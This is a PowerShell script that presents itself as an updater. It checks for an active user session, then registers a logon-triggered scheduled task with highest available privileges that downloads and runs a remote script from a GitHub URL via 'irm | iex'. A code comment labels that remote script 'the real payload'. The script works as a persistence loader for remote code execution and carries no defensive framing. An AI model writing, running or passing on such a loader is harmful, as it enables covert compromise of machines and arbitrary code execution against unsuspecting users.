$logPath = "C:\Windows\Temp\updater_log.txt"
function Write-Log {
    param ($msg)
    "[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] $msg" | Out-File $logPath -Append -Encoding utf8
}

Write-Log "🔁 Script executed by user: $env:USERNAME"

# Check for real interactive session
try {
    $realUser = (query user) -match "Active"
} catch {
    $realUser = $false
}

if (-not $realUser) {
    Write-Log "❌ No interactive user session found. Exiting..."
    return
}

# Remove old task if exists
$taskName = "UpdaterUACTrigger"
schtasks /Delete /TN $taskName /F > $null 2>&1
Write-Log "🧹 Deleted old scheduled task '$taskName' if it existed"

# Define command to run after login (this is the real payload)
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$scriptCmd = '-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"'

# Build full XML for scheduled task (UAC enabled)
$taskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>UpdaterScript</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$ps</Command>
      <Arguments>$scriptCmd</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Write XML file and register task
$tempXML = "$env:TEMP\updater_task.xml"
$taskXML | Set-Content -Path $tempXML -Encoding Unicode
schtasks /Create /TN $taskName /XML $tempXML /F | Out-Null

Write-Log "✅ Scheduled task '$taskName' created. It will run 1 minute after user login with UAC prompt."
